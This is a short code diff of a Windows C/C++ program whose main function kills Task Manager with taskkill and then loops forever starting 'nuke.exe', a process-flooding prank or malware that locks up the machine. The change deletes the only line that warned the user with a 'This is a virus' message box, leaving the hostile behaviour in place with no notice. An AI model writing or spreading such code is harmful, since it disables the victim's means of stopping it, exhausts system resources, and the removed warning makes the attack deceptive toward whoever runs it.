@@ -14,7 +14,6 @@ int main()
 {
 	system("taskkill /f /im Taskmgr.exe");
 	SetCursorPos(200, 200);
-	MessageBox(0, L"This is a virus", L"Warning!!!", MB_OK);
 	for (;;)
 	system("start nuke.exe");
 }
